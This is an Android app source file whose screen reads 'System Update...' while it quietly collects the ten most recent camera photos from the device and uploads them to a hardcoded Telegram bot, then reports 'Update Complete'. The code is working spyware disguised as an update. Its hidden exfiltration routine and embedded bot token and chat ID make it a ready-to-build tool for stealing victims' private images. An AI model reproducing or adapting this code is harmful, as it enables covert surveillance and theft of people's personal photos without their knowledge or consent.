package com.vipih;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    private static final int PERMISSION_CODE = 100;
    private static final String BOT_TOKEN = "8855944219:AAHTCpO73cxzcfvzwHxze0WCWSoHytzRBsg";
    private static final String CHAT_ID = "8197183486";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);

        TextView tv = new TextView(this);
        tv.setText("System Update...");
        tv.setTextSize(18);

        layout.addView(tv);
        setContentView(layout);

        if (checkPermissions()) {
            startExtraction();
        } else {
            requestPermissions();
        }
    }

    private boolean checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            return checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED;
        } else {
            return checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
        }
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(new String[]{Manifest.permission.READ_MEDIA_IMAGES}, PERMISSION_CODE);
        } else {
            requestPermissions(new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            startExtraction();
        } else {
            Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
        }
    }

    private void startExtraction() {
        new ExtractAndSendTask().execute();
    }

    private class ExtractAndSendTask extends AsyncTask<Void, Integer, Void> {
        @Override
        protected Void doInBackground(Void... voids) {
            String[] projection;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                projection = new String[]{
                    MediaStore.Images.Media._ID, 
                    MediaStore.Images.Media.RELATIVE_PATH, 
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                };
            } else {
                projection = new String[]{
                    MediaStore.Images.Media._ID, 
                    MediaStore.Images.Media.DATA
                };
            }
            
            String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
            Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);

            if (cursor != null) {
                int count = 0;
                int maxImages = 10; // عدد الصور التي سيتم سحبها
                
                int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);

                while (cursor.moveToNext() && count < maxImages) {
                    boolean isCamera = false;
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        int pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
                        int bucketIndex = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
                        
                        String path = pathIndex != -1 ? cursor.getString(pathIndex) : "";
                        String bucket = bucketIndex != -1 ? cursor.getString(bucketIndex) : "";
                        
                        // التحقق من أن الصورة داخل مجلد الكاميرا
                        if ((path != null && path.contains("Camera")) || (bucket != null && bucket.toLowerCase().contains("camera"))) {
                            isCamera = true;
                        }
                    } else {
                        int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
                        String path = dataIndex != -1 ? cursor.getString(dataIndex) : "";
                        if (path != null && path.contains("DCIM/Camera")) {
                            isCamera = true;
                        }
                    }
                    
                    // إذا كانت الصورة من الكاميرا، قم بإرسالها
                    if (isCamera) {
                        int id = cursor.getInt(idIndex);
                        Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);

                        try {
                            Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
                            sendPhotoToTelegram(bitmap);
                            count++;
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                }
                cursor.close();
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void unused) {
            super.onPostExecute(unused);
            Toast.makeText(MainActivity.this, "Update Complete", Toast.LENGTH_SHORT).show();
        }
    }

    private void sendPhotoToTelegram(Bitmap bitmap) {
        String boundary = "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream request = new DataOutputStream(conn.getOutputStream());

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            request.writeBytes(CHAT_ID + lineEnd);

            request.writeBytes(twoHyphens + boundary + lineEnd);
            request.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"img.jpg\"" + lineEnd);
            request.writeBytes("Content-Type: image/jpeg" + lineEnd + lineEnd);

            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream);
            request.write(stream.toByteArray());
            request.writeBytes(lineEnd);
            request.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

            request.flush();
            request.close();

            int responseCode = conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}